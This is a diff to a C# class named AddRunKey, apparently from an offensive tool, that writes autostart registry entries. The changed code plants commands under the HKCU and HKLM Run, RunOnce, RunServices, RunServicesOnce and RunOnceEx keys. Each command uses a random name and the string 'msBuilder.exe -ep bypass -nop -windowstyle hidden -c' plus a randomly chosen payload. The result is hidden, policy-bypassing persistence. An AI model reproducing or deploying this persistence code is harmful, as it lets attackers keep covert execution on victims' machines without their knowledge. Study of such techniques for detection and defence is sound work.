@@ -14,11 +14,11 @@ namespace ezclap
 {
 	public class AddRunKey
 	{
-		public AddRunKey (string[] names, string payload)
+		public AddRunKey (string[] names, string[] payloadArr)
 		{
-            Initialize(names, payload);
+            Initialize(names, payloadArr);
 		}
-		public static void Initialize(string[] names, string payload)
+		public static void Initialize(string[] names, string[] payloadArr)
 		{
             Random rnd = new Random();
             int rndNameIdx = rnd.Next(0, names.Length - 1);
@@ -26,16 +26,16 @@ namespace ezclap
              *  Description: Add RunKey registry key with payload  
              */
 
-            payload = "msBuilder.exe -ep bypass -nop -windowstyle hidden -c " + payload;
+            //payload = "msBuilder.exe -ep bypass -nop -windowstyle hidden -c " + payloadArr[rnd.Next(0, payloadArr.Length -1)];
 
-            Utils.setHKCUSubKey(RegistryKeys.RunKey, names[rndNameIdx], payload);
-            Utils.setHKCUSubKey(RegistryKeys.RunOnceKey, names[rndNameIdx], payload);
+            Utils.setHKCUSubKey(RegistryKeys.RunKey, names[rnd.Next(0, names.Length - 1)], "msBuilder.exe -ep bypass -nop -windowstyle hidden -c " + payloadArr[rnd.Next(0, payloadArr.Length -1)]);
+            Utils.setHKCUSubKey(RegistryKeys.RunOnceKey, names[rnd.Next(0, names.Length - 1)], "msBuilder.exe -ep bypass -nop -windowstyle hidden -c " + payloadArr[rnd.Next(0, payloadArr.Length -1)]);
 
-            Utils.setHKLMSubKey(RegistryKeys.RunKey, names[rndNameIdx], payload);
-            Utils.setHKLMSubKey(RegistryKeys.RunOnceKey, names[rndNameIdx], payload);
-            Utils.setHKLMSubKey(RegistryKeys.RunServices, names[rndNameIdx], payload);
-            Utils.setHKLMSubKey(RegistryKeys.RunServicesOnce, names[rndNameIdx], payload);
-            Utils.setHKLMSubKey(RegistryKeys.RunOnceEx, names[rndNameIdx], payload);
+            Utils.setHKLMSubKey(RegistryKeys.RunKey, names[rnd.Next(0, names.Length - 1)], "msBuilder.exe -ep bypass -nop -windowstyle hidden -c " + payloadArr[rnd.Next(0, payloadArr.Length -1)]);
+            Utils.setHKLMSubKey(RegistryKeys.RunOnceKey, names[rnd.Next(0, names.Length - 1)], "msBuilder.exe -ep bypass -nop -windowstyle hidden -c " + payloadArr[rnd.Next(0, payloadArr.Length -1)]);
+            Utils.setHKLMSubKey(RegistryKeys.RunServices, names[rnd.Next(0, names.Length - 1)], "msBuilder.exe -ep bypass -nop -windowstyle hidden -c " + payloadArr[rnd.Next(0, payloadArr.Length -1)]);
+            Utils.setHKLMSubKey(RegistryKeys.RunServicesOnce, names[rnd.Next(0, names.Length - 1)], "msBuilder.exe -ep bypass -nop -windowstyle hidden -c " + payloadArr[rnd.Next(0, payloadArr.Length -1)]);
+            Utils.setHKLMSubKey(RegistryKeys.RunOnceEx, names[rnd.Next(0, names.Length - 1)], "msBuilder.exe -ep bypass -nop -windowstyle hidden -c " + payloadArr[rnd.Next(0, payloadArr.Length -1)]);
             
         } 
 
